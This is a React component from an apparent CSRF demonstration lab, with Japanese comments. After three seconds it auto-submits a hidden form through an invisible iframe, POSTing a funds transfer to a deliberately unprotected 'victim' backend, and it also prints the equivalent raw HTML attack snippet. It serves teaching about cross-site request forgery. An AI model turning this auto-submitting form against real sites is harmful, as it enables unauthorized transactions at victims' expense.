import { useEffect, useRef, useState } from "react";
import { VICTIM_API_BASE, DEFAULT_TARGET, DEFAULT_AMOUNT } from "../config.js";

/**
 * ① 隠し form を自動 submit する古典的 CSRF
 *
 * - enctype は application/x-www-form-urlencoded（CORS の単純リクエスト）
 * - target を不可視 iframe にしてページ遷移を起こさず実行する
 * - 被害者バックエンドは @csrf_exempt なのでトークン検証なしで送金が成立する
 */
export default function AutoFormTrap() {
  const formRef = useRef(null);
  const [sent, setSent] = useState(false);

  useEffect(() => {
    const t = setTimeout(() => {
      formRef.current?.submit();
      setSent(true);
    }, 3000);
    return () => clearTimeout(t);
  }, []);

  const action = `${VICTIM_API_BASE}/api/transfer/`;

  return (
    <>
      <pre>{`<form action="${action}" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input name="to" value="${DEFAULT_TARGET}">
  <input name="amount" value="${DEFAULT_AMOUNT}">
</form>
<script>document.forms[0].submit();</script>`}</pre>

      <p className={sent ? "success" : "hint"}>
        {sent ? "📤 送信しました。victim-frontend で残高を確認してください。" : "3 秒後に自動送信します..."}
      </p>

      <iframe name="evil_frame" title="evil" style={{ display: "none" }} />
      <form ref={formRef} action={action} method="POST" encType="application/x-www-form-urlencoded" target="evil_frame">
        <input type="hidden" name="to" value={DEFAULT_TARGET} />
        <input type="hidden" name="amount" value={DEFAULT_AMOUNT} />
      </form>
    </>
  );
}
